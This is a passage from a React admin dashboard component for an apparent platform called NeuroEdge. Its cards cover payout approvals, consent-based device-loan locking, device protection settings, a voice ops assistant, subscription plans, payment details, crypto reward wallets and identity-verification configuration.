        {computeAutoPayoutConfig.lastRunAt
          ? `${new Date(Number(computeAutoPayoutConfig.lastRunAt)).toLocaleString()} (${String(
              computeAutoPayoutConfig.lastRunBucket || "-"
            )})`
          : "not yet"}
      </div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: 8, marginTop: 8 }}>
        <input value={computePayoutBudget.period} onChange={(e) => setComputePayoutBudget((p) => ({ ...p, period: e.target.value }))} placeholder="Period YYYY-MM" style={{ ...input, minWidth: 0 }} />
        <input value={String(computePayoutBudget.totalRevenueUsd)} onChange={(e) => setComputePayoutBudget((p) => ({ ...p, totalRevenueUsd: Number(e.target.value) || 0 }))} placeholder="Total Revenue USD" style={{ ...input, minWidth: 0 }} />
        <input value={String(computePayoutBudget.allocatedUsd)} onChange={(e) => setComputePayoutBudget((p) => ({ ...p, allocatedUsd: Number(e.target.value) || 0 }))} placeholder="Allocated USD" style={{ ...input, minWidth: 0 }} />
        <input value={String(computePayoutBudget.reserveUsd)} onChange={(e) => setComputePayoutBudget((p) => ({ ...p, reserveUsd: Number(e.target.value) || 0 }))} placeholder="Reserve USD" style={{ ...input, minWidth: 0 }} />
      </div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(130px, 1fr))", gap: 8, marginTop: 8 }}>
        <Stat label="Pending" value={`$${Number(computePayoutBudget.pendingUsd || 0).toFixed(2)}`} />
        <Stat label="Approved" value={`$${Number(computePayoutBudget.approvedUsd || 0).toFixed(2)}`} />
        <Stat label="Sent" value={`$${Number(computePayoutBudget.sentUsd || 0).toFixed(2)}`} />
      </div>
      <div style={{ marginTop: 8, maxHeight: 220, overflowY: "auto", display: "grid", gap: 6 }}>
        {computePayoutRequestsAdmin.length === 0 && <div style={muted}>No payout requests.</div>}
        {computePayoutRequestsAdmin.map((r) => (
          <div key={r.id} style={log}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
              <strong>{r.userName} ({r.userId})</strong>
              <span>{r.status}</span>
            </div>
            <div>{r.id} • target {r.target} • ${Number(r.amountUsd || 0).toFixed(2)} • {Number(r.amountWdc || 0).toFixed(6)} WDC • {Number(r.points || 0)} pts</div>
            {String(r.status) === "pending_approval" && (
              <div style={{ display: "flex", gap: 6, marginTop: 6, flexWrap: "wrap" }}>
                <button style={primary} onClick={() => approveComputePayout(r.id, "scheduled")}>Approve (Scheduler)</button>
                <button style={chip} onClick={() => approveComputePayout(r.id, "instant")}>Approve Instant</button>
                <button style={chip} onClick={() => rejectComputePayout(r.id)}>Reject</button>
              </div>
            )}
            {r.txRef ? <div style={muted}>TX: {r.txRef}</div> : null}
          </div>
        ))}
      </div>
    </Card>
  );

  const loanOpsShieldCard = (
    <Card title="LoanOps Shield Center (Founder/Admin/Enterprise)">
      <div style={muted}>
        Consent-based device-loan security: registration, intake import, overdue restriction mode, paid-off unlock, API key integrations, and audited actions.
      </div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
        <button style={chip} onClick={refreshLoanOps}>Refresh</button>
      </div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4, minmax(120px, 1fr))", gap: 8, marginTop: 8 }}>
        <Stat label="Companies" value={String(loanOpsCompanies.length)} />
        <Stat label="Loan Devices" value={String(loanOpsDevices.length)} />
        <Stat label="API Keys" value={String(loanOpsApiKeys.length)} />
        <Stat label="Intake Logs" value={String(loanOpsIntakeLogs.length)} />
      </div>

      <div style={{ marginTop: 10, fontWeight: 700 }}>Company Registry</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(160px, 1fr))", gap: 8 }}>
        <input value={loanCompanyDraft.id} onChange={(e) => setLoanCompanyDraft((p) => ({ ...p, id: e.target.value }))} placeholder="Company ID (optional)" style={input} />
        <input value={loanCompanyDraft.name} onChange={(e) => setLoanCompanyDraft((p) => ({ ...p, name: e.target.value }))} placeholder="Company Name" style={input} />
        <input value={loanCompanyDraft.contactEmail} onChange={(e) => setLoanCompanyDraft((p) => ({ ...p, contactEmail: e.target.value }))} placeholder="Contact Email" style={input} />
        <input value={loanCompanyDraft.contactPhone} onChange={(e) => setLoanCompanyDraft((p) => ({ ...p, contactPhone: e.target.value }))} placeholder="Contact Phone" style={input} />
        <input value={loanCompanyDraft.legalPolicyRef} onChange={(e) => setLoanCompanyDraft((p) => ({ ...p, legalPolicyRef: e.target.value }))} placeholder="Legal Policy Ref URL" style={input} />
      </div>
      <button style={primary} onClick={upsertLoanCompany}>Save Company</button>
      <div style={{ marginTop: 8, fontWeight: 700 }}>Policy (Attestation + Re-lock)</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(160px, 1fr))", gap: 8 }}>
        <button style={chip} onClick={() => setLoanOpsPolicy((p) => ({ ...p, consentRequired: !p.consentRequired }))}>
          Consent required: {loanOpsPolicy.consentRequired ? "on" : "off"}
        </button>
        <button
          style={chip}
          onClick={() =>
            setLoanOpsPolicy((p) => ({ ...p, attestationRequiredDefault: !p.attestationRequiredDefault }))
          }
        >
          Attestation default: {loanOpsPolicy.attestationRequiredDefault ? "on" : "off"}
        </button>
        <button
          style={chip}
          onClick={() => setLoanOpsPolicy((p) => ({ ...p, autoRelockOnLoanDefault: !p.autoRelockOnLoanDefault }))}
        >
          Auto re-lock on loan: {loanOpsPolicy.autoRelockOnLoanDefault ? "on" : "off"}
        </button>
        <input
          value={loanOpsPolicy.allowedAttestationProvidersCsv}
          onChange={(e) => setLoanOpsPolicy((p) => ({ ...p, allowedAttestationProvidersCsv: e.target.value }))}
          placeholder="Attestation providers csv"
          style={{ ...input, gridColumn: "span 3" }}
        />
      </div>
      <button style={chip} onClick={saveLoanOpsPolicy}>Save LoanOps Policy</button>

      <div style={{ marginTop: 10, fontWeight: 700 }}>Device Intake / Import</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(160px, 1fr))", gap: 8 }}>
        <input value={loanDeviceDraft.companyId} onChange={(e) => setLoanDeviceDraft((p) => ({ ...p, companyId: e.target.value }))} placeholder="Company ID" style={input} />
        <input value={loanDeviceDraft.id} onChange={(e) => setLoanDeviceDraft((p) => ({ ...p, id: e.target.value }))} placeholder="Device ID (optional)" style={input} />
        <input value={loanDeviceDraft.model} onChange={(e) => setLoanDeviceDraft((p) => ({ ...p, model: e.target.value }))} placeholder="Model" style={input} />
        <input value={loanDeviceDraft.serial} onChange={(e) => setLoanDeviceDraft((p) => ({ ...p, serial: e.target.value }))} placeholder="Serial" style={input} />
        <input value={loanDeviceDraft.imei} onChange={(e) => setLoanDeviceDraft((p) => ({ ...p, imei: e.target.value }))} placeholder="IMEI" style={input} />
        <input value={loanDeviceDraft.ownerRef} onChange={(e) => setLoanDeviceDraft((p) => ({ ...p, ownerRef: e.target.value }))} placeholder="Owner Reference" style={input} />
      </div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <button style={primary} onClick={upsertLoanDevice}>Save Loan Device</button>
      </div>
      <textarea
        value={loanImportText}
        onChange={(e) => setLoanImportText(e.target.value)}
        placeholder="Paste device lines from OCR/PDF/Image text extraction. Format: externalId,model,serial,imei,ownerRef"
        style={{ ...input, minHeight: 80, marginTop: 8 }}
      />
      <button style={chip} onClick={importLoanDevicesFromText}>Import Device Lines</button>

      <div style={{ marginTop: 10, fontWeight: 700 }}>API Keys + Integrations</div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <input value={loanApiKeyCompanyId} onChange={(e) => setLoanApiKeyCompanyId(e.target.value)} placeholder="Company ID" style={input} />
        <input value={loanApiKeyName} onChange={(e) => setLoanApiKeyName(e.target.value)} placeholder="Key name" style={input} />
        <button style={primary} onClick={createLoanApiKey}>Generate LoanOps API Key</button>
        <button style={chip} onClick={saveLoanIntegration}>Save Plug-in Integration</button>
      </div>
      <div style={{ marginTop: 10, fontWeight: 700 }}>Compliance / Re-enroll / Lock Controls</div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <input
          value={loanSelectedDeviceId}
          onChange={(e) => setLoanSelectedDeviceId(e.target.value)}
          placeholder="Selected Device ID"
          style={input}
        />
        <select value={loanAttestationProvider} onChange={(e) => setLoanAttestationProvider(e.target.value)} style={input}>
          <option value="android_play_integrity">android_play_integrity</option>
          <option value="ios_devicecheck">ios_devicecheck</option>
          <option value="desktop_tpm">desktop_tpm</option>
        </select>
        <select value={loanAttestationStatus} onChange={(e) => setLoanAttestationStatus(e.target.value as "passed" | "failed")} style={input}>
          <option value="passed">passed</option>
          <option value="failed">failed</option>
        </select>
        <button style={chip} onClick={reportLoanAttestation}>Record Attestation</button>
        <button style={chip} onClick={() => setLoanBootIntegrityOk((v) => !v)}>
          Boot integrity: {loanBootIntegrityOk ? "ok" : "failed"}
        </button>
        <button style={chip} onClick={runLoanBootCheck}>Run Boot Check</button>
        <button style={chip} onClick={() => triggerLoanLock(true)}>Trigger Lock</button>
        <button style={chip} onClick={() => triggerLoanLock(false)}>Trigger Unlock</button>
        <button style={chip} onClick={markLoanReenrolled}>Mark Re-enrolled</button>
      </div>

      <div style={{ marginTop: 8, maxHeight: 220, overflowY: "auto", display: "grid", gap: 6 }}>
        {loanOpsDevices.slice(0, 80).map((d) => (
          <div key={d.id} style={log}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
              <strong>{d.model} ({d.id})</strong>
              <span>{d.loanStatus} • {d.securityState || "protected"}</span>
            </div>
            <div>Company: {d.companyId} • IMEI: {d.imei || "-"} • Serial: {d.serial || "-"}</div>
            <div>
              Compliance: {d.complianceState || "trusted"} • Attestation: {d.attestationStatus || "unknown"}{" "}
              {d.attestationProvider ? `(${d.attestationProvider})` : ""} • Lock: {d.lockState || "unlocked"}
            </div>
            <div style={{ display: "flex", gap: 6, marginTop: 6, flexWrap: "wrap" }}>
              <button style={chip} onClick={() => setLoanSelectedDeviceId(d.id)}>Select Device</button>
              <button style={chip} onClick={() => updateLoanStatus(d.id, "overdue", 15)}>Mark Overdue</button>
              <button style={chip} onClick={() => updateLoanStatus(d.id, "grace", 0)}>Set Grace</button>
              <button style={chip} onClick={() => updateLoanStatus(d.id, "paid_off", 0)}>Mark Paid Off (Unlock)</button>
            </div>
          </div>
        ))}
      </div>
      <div style={{ marginTop: 10, fontWeight: 700 }}>Dispute + Legal Consent Workflow</div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <input
          value={loanDisputeReason}
          onChange={(e) => setLoanDisputeReason(e.target.value)}
          placeholder="Dispute reason"
          style={input}
        />
        <input
          value={loanDisputeEvidenceRef}
          onChange={(e) => setLoanDisputeEvidenceRef(e.target.value)}
          placeholder="Evidence ref URL"
          style={input}
        />
        <button style={chip} onClick={openLoanDispute}>Open Dispute</button>
      </div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 6 }}>
        <input
          value={loanConsentSubjectRef}
          onChange={(e) => setLoanConsentSubjectRef(e.target.value)}
          placeholder="Consent subject ref (customer id/email)"
          style={input}
        />
        <input
          value={loanConsentType}
          onChange={(e) => setLoanConsentType(e.target.value)}
          placeholder="Consent type"
          style={input}
        />
        <button style={chip} onClick={recordLoanLegalConsent}>Record Legal Consent</button>
      </div>
      <div style={{ marginTop: 8, maxHeight: 140, overflowY: "auto", display: "grid", gap: 6 }}>
        {loanOpsDisputes.slice(0, 20).map((d) => (
          <div key={d.id} style={row}>
            <span>{d.id} • {d.deviceId} • {d.status} • {d.reason || "-"}</span>
            {d.status !== "resolved" ? (
              <button style={chip} onClick={() => resolveLoanDispute(d.id)}>Resolve</button>
            ) : null}
          </div>
        ))}
      </div>
      <div style={{ marginTop: 8, maxHeight: 160, overflowY: "auto", display: "grid", gap: 6 }}>
        {loanOpsApiKeys.map((k) => (
          <div key={k.id} style={row}>
            <span>{k.name} • {k.companyId} • {k.keyMasked} • {k.status}</span>
            <button style={chip} onClick={() => revokeLoanApiKey(k.id)}>Revoke</button>
          </div>
        ))}
      </div>
    </Card>
  );

  const userProtectionCard = (
    <Card title="My Device Protection Plan">
      <div style={muted}>
        Protection is consent-based and OS-compliant. Flash/uninstall resistance depends on device OEM/MDM capabilities; NeuroEdge does not bypass OS security controls.
      </div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
        <button style={chip} onClick={refreshUserProtection}>Refresh</button>
      </div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(120px, 1fr))", gap: 8, marginTop: 8 }}>
        <Stat label="Plan" value={String(userProtectionProfile?.planTier || "free")} />
        <Stat label="Protected Devices" value={String(userProtectionProfile?.devices?.length || 0)} />
        <Stat label="Max Devices" value={String(userProtectionProfile?.maxDevices || (userProtectionPolicy?.freeMaxDevices || 1))} />
      </div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
        <button
          style={chip}
          onClick={() =>
            setUserProtectionProfile((p) => (p ? { ...p, antiTheftConsent: !p.antiTheftConsent } : p))
          }
        >
          Anti-theft consent: {userProtectionProfile?.antiTheftConsent ? "on" : "off"}
        </button>
        <button
          style={chip}
          onClick={() =>
            setUserProtectionProfile((p) => (p ? { ...p, locationConsent: !p.locationConsent } : p))
          }
        >
          Location consent: {userProtectionProfile?.locationConsent ? "on" : "off"}
        </button>
        <button
          style={chip}
          onClick={() =>
            setUserProtectionProfile((p) => (p ? { ...p, cameraEvidenceConsent: !p.cameraEvidenceConsent } : p))
          }
        >
          Camera evidence consent: {userProtectionProfile?.cameraEvidenceConsent ? "on" : "off"}
        </button>
        <button style={primary} onClick={saveUserProtectionSettings}>Save Consent</button>
      </div>

      <div style={{ marginTop: 10, fontWeight: 700 }}>Protected Devices</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(140px, 1fr))", gap: 8 }}>
        <input value={userProtectDeviceDraft.id} onChange={(e) => setUserProtectDeviceDraft((p) => ({ ...p, id: e.target.value }))} placeholder="Device ID (optional)" style={input} />
        <input value={userProtectDeviceDraft.label} onChange={(e) => setUserProtectDeviceDraft((p) => ({ ...p, label: e.target.value }))} placeholder="Device label" style={input} />
        <select value={userProtectDeviceDraft.platform} onChange={(e) => setUserProtectDeviceDraft((p) => ({ ...p, platform: e.target.value }))} style={input}>
          <option value="android">android</option>
          <option value="ios">ios</option>
          <option value="windows">windows</option>
          <option value="macos">macos</option>
          <option value="linux">linux</option>
        </select>
      </div>
      <button style={primary} onClick={upsertProtectedDevice}>Save Protected Device</button>
      <div style={{ marginTop: 8, maxHeight: 160, overflowY: "auto", display: "grid", gap: 6 }}>
        {(userProtectionProfile?.devices || []).map((d) => (
          <div key={d.id} style={log}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
              <strong>{d.label} ({d.id})</strong>
              <span>{d.status}</span>
            </div>
            <div>Platform: {d.platform}</div>
            <div style={{ display: "flex", gap: 6, marginTop: 6 }}>
              <button style={chip} onClick={() => applyUserDeviceAction(d.id, "pause")}>Pause</button>
              <button style={chip} onClick={() => applyUserDeviceAction(d.id, "resume")}>Resume</button>
              <button style={chip} onClick={() => applyUserDeviceAction(d.id, "remove")}>Remove</button>
            </div>
          </div>
        ))}
      </div>

      <div style={{ marginTop: 10, fontWeight: 700 }}>Trusted Contact Recovery</div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <input value={trustedContactDraft.name} onChange={(e) => setTrustedContactDraft((p) => ({ ...p, name: e.target.value }))} placeholder="Contact name" style={input} />
        <input value={trustedContactDraft.endpoint} onChange={(e) => setTrustedContactDraft((p) => ({ ...p, endpoint: e.target.value }))} placeholder="Email or phone" style={input} />
        <select value={trustedContactDraft.channel} onChange={(e) => setTrustedContactDraft((p) => ({ ...p, channel: e.target.value }))} style={input}>
          <option value="email">email</option>
          <option value="sms">sms</option>
        </select>
        <button style={primary} onClick={saveTrustedContact}>Save Contact</button>
      </div>
      <div style={{ marginTop: 8, maxHeight: 130, overflowY: "auto", display: "grid", gap: 6 }}>
        {(userProtectionProfile?.trustedContacts || []).map((c) => (
          <div key={c.id} style={log}>
            {c.name} • {c.channel} • {c.endpoint} • {c.verified ? "verified" : "unverified"}
          </div>
        ))}
      </div>

      <div style={{ marginTop: 10, fontWeight: 700 }}>Incident Report (Tamper/Theft)</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(140px, 1fr))", gap: 8 }}>
        <input value={incidentDraft.deviceId} onChange={(e) => setIncidentDraft((p) => ({ ...p, deviceId: e.target.value }))} placeholder="Device ID" style={input} />
        <input value={incidentDraft.cameraEvidenceRef} onChange={(e) => setIncidentDraft((p) => ({ ...p, cameraEvidenceRef: e.target.value }))} placeholder="Camera evidence ref URI" style={input} />
        <input value={incidentDraft.note} onChange={(e) => setIncidentDraft((p) => ({ ...p, note: e.target.value }))} placeholder="Incident note" style={input} />
        <input value={incidentDraft.lat} onChange={(e) => setIncidentDraft((p) => ({ ...p, lat: e.target.value }))} placeholder="Latitude (optional)" style={input} />
        <input value={incidentDraft.lng} onChange={(e) => setIncidentDraft((p) => ({ ...p, lng: e.target.value }))} placeholder="Longitude (optional)" style={input} />
      </div>
      <button style={chip} onClick={reportProtectionIncident}>Report Incident</button>
      <div style={{ marginTop: 8, maxHeight: 140, overflowY: "auto", display: "grid", gap: 6 }}>
        {userProtectionIncidents.slice(0, 20).map((i) => (
          <div key={i.id} style={log}>
            {i.eventType} • device {i.deviceId} • {new Date(Number(i.createdAt || Date.now())).toLocaleString()}
          </div>
        ))}
      </div>
    </Card>
  );

  const voiceOpsCopilotCard = (
    <Card title="NeuroEdge Voice Ops Copilot">
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", alignItems: "center" }}>
        <input
          value={opsVoiceQuery}
          onChange={(e) => setOpsVoiceQuery(e.target.value)}
          placeholder="Ask: which node is down, what was updated, what is trending, create coding plan..."
          style={{ ...input, flex: 1, minWidth: 280 }}
        />
        <button style={primary} onClick={() => askOpsAssistant()}>
          Ask
        </button>
        <button style={chip} onClick={opsVoiceListening ? stopOpsListening : startOpsListening} disabled={!opsVoiceSupported}>
          {opsVoiceListening ? "Stop Mic" : "Start Mic"}
        </button>
      </div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
        <label style={chip}>
          <input
            type="checkbox"
            checked={opsVoiceAutoSpeak}
            onChange={(e) => setOpsVoiceAutoSpeak(e.target.checked)}
            style={{ marginRight: 6 }}
          />
          Auto Speak
        </label>
        <label style={chip}>
          <input
            type="checkbox"
            checked={opsVoiceLiveInterrupt}
            onChange={(e) => setOpsVoiceLiveInterrupt(e.target.checked)}
            style={{ marginRight: 6 }}
          />
          Live Interrupt
        </label>
        <label style={chip}>
          <input
            type="checkbox"
            checked={opsVoicePushToTalk}
            onChange={(e) => setOpsVoicePushToTalk(e.target.checked)}
            style={{ marginRight: 6 }}
          />
          Push-to-Talk
        </label>
        <input
          value={opsVoiceHotkey}
          onChange={(e) => setOpsVoiceHotkey(e.target.value)}
          placeholder="Hotkey e.g. Alt+V"
          style={{ ...input, maxWidth: 150 }}
        />
        <select value={opsVoiceLanguage} onChange={(e) => setOpsVoiceLanguage(e.target.value)} style={{ ...input, maxWidth: 160 }}>
          <option value="en-US">en-US</option>
          <option value="en-GB">en-GB</option>
          <option value="sw-KE">sw-KE</option>
          <option value="fr-FR">fr-FR</option>
          <option value="es-ES">es-ES</option>
          <option value="de-DE">de-DE</option>
        </select>
        <span style={muted}>Role-aware: founder/admin/dev/enterprise/user • mic support: {opsVoiceSupported ? "yes" : "no"}</span>
      </div>
      {opsVoiceStreamText ? (
        <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 120, overflow: "auto", marginTop: 8 }}>
          {opsVoiceStreamText}
        </pre>
      ) : null}
      <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 240, overflow: "auto", marginTop: 8 }}>
        {opsVoiceOutput ? JSON.stringify(opsVoiceOutput, null, 2) : "No response yet. Try: 'Which node is down?' or 'What are users trending on?'."}
      </pre>
    </Card>
  );

  const founderView = (
    <div style={grid}>
      {voiceOpsCopilotCard}
      {trainingStudioCard}
      {domainRegistryCard}
      {accessControlCard}
      {deviceProtectionCard}
      {aegisShieldCard}
      {creatorEngineCard}
      {cortexCoreCard}
      {artifactWorkspaceCard}
      {neuroExpansionBuilderCard}
      {computePayoutAdminCard}
      {loanOpsShieldCard}
      {reliabilityOpsCard}
      <Card title="Platform Analytics">
        <Stat label="Users" value={String(users.length)} />
        <Stat label="Requests" value={String(reqTotal)} />
        <Stat label="Token Usage" value={tokenTotal.toLocaleString()} />
        <Stat label="Estimated Revenue" value={`$${estRevenue}`} />
      </Card>
      <Card title="Subscription & Plan Control">
        {plans.map((p) => (
          <div key={p.id} style={row}>
            <span>{p.name} (${p.monthly}/mo, ${p.annual}/yr)</span>
            <button
              style={chip}
              onClick={async () => {
                if (p.active && !confirmSafeAction({ title: `${p.name} plan`, actionLabel: "disable" })) return;
                await callAction("/admin/dashboard/plans/toggle", { id: p.id });
              }}
            >
              {p.active ? "Disable" : "Enable"}
            </button>
          </div>
        ))}
        <button style={primary} onClick={addPlan}>+ Add Plan</button>
      </Card>
      <Card title="Payment Profile (Dashboard-Managed)">
        <input placeholder="Card holder" value={payment.cardHolder} onChange={(e) => setPayment((p) => ({ ...p, cardHolder: e.target.value }))} style={input} />
        <input placeholder="Card number" value={paymentDraftCard} onChange={(e) => setPaymentDraftCard(e.target.value)} style={input} />
        <div style={{ display: "flex", gap: 8 }}>
          <input placeholder="MM" value={payment.expMonth} onChange={(e) => setPayment((p) => ({ ...p, expMonth: e.target.value }))} style={input} />
          <input placeholder="YYYY" value={payment.expYear} onChange={(e) => setPayment((p) => ({ ...p, expYear: e.target.value }))} style={input} />
        </div>
        <input placeholder="Billing email" value={payment.billingEmail} onChange={(e) => setPayment((p) => ({ ...p, billingEmail: e.target.value }))} style={input} />
        <input placeholder="Country" value={payment.country} onChange={(e) => setPayment((p) => ({ ...p, country: e.target.value }))} style={input} />
        <input placeholder="Tax ID (optional)" value={payment.taxId} onChange={(e) => setPayment((p) => ({ ...p, taxId: e.target.value }))} style={input} />
        <div style={muted}>Stored card: {payment.cardNumberMasked || "not set"}</div>
        <button style={primary} onClick={savePaymentDetails}>Save Payment Details</button>
      </Card>
      <Card title="Compute Donation Rewards (Crypto Wallet)">
        <div style={row}>
          <span>Enable rewards</span>
          <button
            style={chip}
            onClick={() => setCryptoRewards((p) => ({ ...p, enabled: !p.enabled }))}
          >
            {cryptoRewards.enabled ? "Enabled" : "Disabled"}
          </button>
        </div>
        <div style={{ display: "flex", gap: 8 }}>
          <input
            value={cryptoRewards.chain}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, chain: e.target.value }))}
            placeholder="Chain"
            style={input}
          />
          <input
            value={cryptoRewards.token}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, token: e.target.value }))}
            placeholder="Token"
            style={input}
          />
        </div>
        <input
          value={cryptoRewards.founderWalletAddress}
          onChange={(e) => setCryptoRewards((p) => ({ ...p, founderWalletAddress: e.target.value }))}
          placeholder="Founder wallet address"
          style={input}
        />
        <input
          value={cryptoRewards.neuroChainRpcUrl || ""}
          onChange={(e) => setCryptoRewards((p) => ({ ...p, neuroChainRpcUrl: e.target.value }))}
          placeholder="NeuroChain RPC URL"
          style={input}
        />
        <input
          value={cryptoRewards.wdcContractAddress || ""}
          onChange={(e) => setCryptoRewards((p) => ({ ...p, wdcContractAddress: e.target.value }))}
          placeholder="WDC Contract Address"
          style={input}
        />
        <input
          value={cryptoRewards.wdcWalletAppUrl || ""}
          onChange={(e) => setCryptoRewards((p) => ({ ...p, wdcWalletAppUrl: e.target.value }))}
          placeholder="WDC Wallet App URL"
          style={input}
        />
        <div style={{ display: "flex", gap: 8 }}>
          <input
            value={cryptoRewards.rewardPerComputeUnit}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, rewardPerComputeUnit: e.target.value }))}
            placeholder="Reward per compute unit"
            style={input}
          />
          <input
            value={cryptoRewards.minPayout}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, minPayout: e.target.value }))}
            placeholder="Minimum payout"
            style={input}
          />
        </div>
        <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
          <select
            value={cryptoRewards.payoutSchedule}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, payoutSchedule: e.target.value as CryptoRewardsConfig["payoutSchedule"] }))}
            style={input}
          >
            <option value="hourly">hourly</option>
            <option value="daily">daily</option>
            <option value="weekly">weekly</option>
            <option value="monthly">monthly</option>
          </select>
          <input
            type="number"
            value={cryptoRewards.treasuryAllocationPct}
            onChange={(e) => setCryptoRewards((p) => ({ ...p, treasuryAllocationPct: Number(e.target.value) || 0 }))}
            placeholder="Treasury %"
            style={input}
          />
        </div>
        <div style={row}>
          <span>Donor bonus</span>
          <button
            style={chip}
            onClick={() => setCryptoRewards((p) => ({ ...p, donorBonusEnabled: !p.donorBonusEnabled }))}
          >
            {cryptoRewards.donorBonusEnabled ? "Enabled" : "Disabled"}
          </button>
        </div>
        <textarea
          value={cryptoRewards.notes}
          onChange={(e) => setCryptoRewards((p) => ({ ...p, notes: e.target.value }))}
          placeholder="Notes and payout policy"
          style={{ ...input, minHeight: 80 }}
        />
        <div style={muted}>
          Ready state: stores compute donation reward policy and payout wallet config for transparent reward accounting.
        </div>
        <button style={primary} onClick={saveCryptoRewards}>Save Crypto Rewards</button>
      </Card>
      <Card title="Rewards Wallets (Points → Cash/WDC Ready)">
        <div style={{ display: "grid", gap: 8 }}>
          <div style={{ display: "flex", gap: 8 }}>
            <input value={rewardUserId} onChange={(e) => setRewardUserId(e.target.value)} placeholder="User ID" style={input} />
            <input value={rewardUserName} onChange={(e) => setRewardUserName(e.target.value)} placeholder="User name" style={input} />
            <input value={rewardPointsInput} onChange={(e) => setRewardPointsInput(e.target.value)} placeholder="Points" style={input} />
          </div>
          <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
            <button style={primary} onClick={creditPoints}>Credit Points</button>
            <button style={chip} onClick={debitPoints}>Debit Points</button>
            <button style={chip} onClick={() => convertPoints("cash")}>Convert → Cash</button>
            <button style={chip} onClick={() => convertPoints("wdc")}>Convert → WDC</button>
          </div>
          <div style={{ display: "flex", gap: 8 }}>
            <input
              type="number"
              value={rewardsLedger.config.pointsPerUsd}
              onChange={(e) =>
                setRewardsLedger((p) => ({ ...p, config: { ...p.config, pointsPerUsd: Number(e.target.value) || 1 } }))
              }
              placeholder="Points per USD"
              style={input}
            />
            <input
              type="number"
              step="0.000001"
              value={rewardsLedger.config.wdcPerPoint}
              onChange={(e) =>
                setRewardsLedger((p) => ({ ...p, config: { ...p.config, wdcPerPoint: Number(e.target.value) || 0 } }))
              }
              placeholder="WDC per point"
              style={input}
            />
            <select
              value={rewardsLedger.config.payoutMode}
              onChange={(e) =>
                setRewardsLedger((p) => ({
                  ...p,
                  config: { ...p.config, payoutMode: e.target.value as RewardsLedger["config"]["payoutMode"] },
                }))
              }
              style={input}
            >
              <option value="points_only">points_only</option>
              <option value="cash_only">cash_only</option>
              <option value="wdc_only">wdc_only</option>
              <option value="hybrid">hybrid</option>
            </select>
          </div>
          <div style={row}>
            <span>WDC listing live</span>
            <button
              style={chip}
              onClick={() =>
                setRewardsLedger((p) => ({
                  ...p,
                  config: { ...p.config, wdcListingLive: !p.config.wdcListingLive },
                }))
              }
            >
              {rewardsLedger.config.wdcListingLive ? "Enabled" : "Disabled"}
            </button>
          </div>
          <button style={primary} onClick={saveRewardsConfig}>Save Conversion Config</button>
        </div>
        <div style={{ display: "grid", gap: 8, marginTop: 8 }}>
          {rewardsLedger.wallets.length === 0 && <div style={muted}>No reward wallets yet.</div>}
          {rewardsLedger.wallets.map((w) => (
            <div key={w.userId} style={log}>
              <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
                <strong>{w.userName} ({w.userId})</strong>
                <span>{new Date(w.updatedAt || Date.now()).toLocaleString()}</span>
              </div>
              <div>Points: {Number(w.points || 0).toLocaleString()} • Total Earned: {Number(w.totalEarnedPoints || 0).toLocaleString()}</div>
              <div>Pending Cash: ${Number(w.pendingCashUsd || 0).toFixed(2)} • Pending WDC: {Number(w.pendingWdc || 0).toFixed(6)}</div>
            </div>
          ))}
        </div>
      </Card>
      <Card title="IDVerse Identity Bridge">
        <div style={row}>
          <span>Enabled</span>
          <button style={chip} onClick={() => setIdverseConfig((p) => ({ ...p, enabled: !p.enabled }))}>
            {idverseConfig.enabled ? "Enabled" : "Disabled"}
          </button>
        </div>
        <input
          value={idverseConfig.baseUrl}
          onChange={(e) => setIdverseConfig((p) => ({ ...p, baseUrl: e.target.value }))}
          placeholder="IDVerse base URL (https://...)"
          style={input}
        />
        <input
          value={idverseConfig.projectId}
          onChange={(e) => setIdverseConfig((p) => ({ ...p, projectId: e.target.value }))}
          placeholder="Project ID"
          style={input}
        />
        <input
          value={idverseConfig.apiKey}
          onChange={(e) => setIdverseConfig((p) => ({ ...p, apiKey: e.target.value }))}
          placeholder={idverseConfig.apiKeyMasked ? `API Key (${idverseConfig.apiKeyMasked})` : "IDVerse API key"}
          style={input}
        />
        <div style={{ display: "flex", gap: 8 }}>
          <input
            type="number"
            value={idverseConfig.timeoutMs}
            onChange={(e) => setIdverseConfig((p) => ({ ...p, timeoutMs: Number(e.target.value) || 12000 }))}
            placeholder="Timeout ms"
            style={input}
          />
          <button style={chip} onClick={() => setIdverseConfig((p) => ({ ...p, strictBiometric: !p.strictBiometric }))}>
            Biometrics: {idverseConfig.strictBiometric ? "strict" : "relaxed"}
          </button>
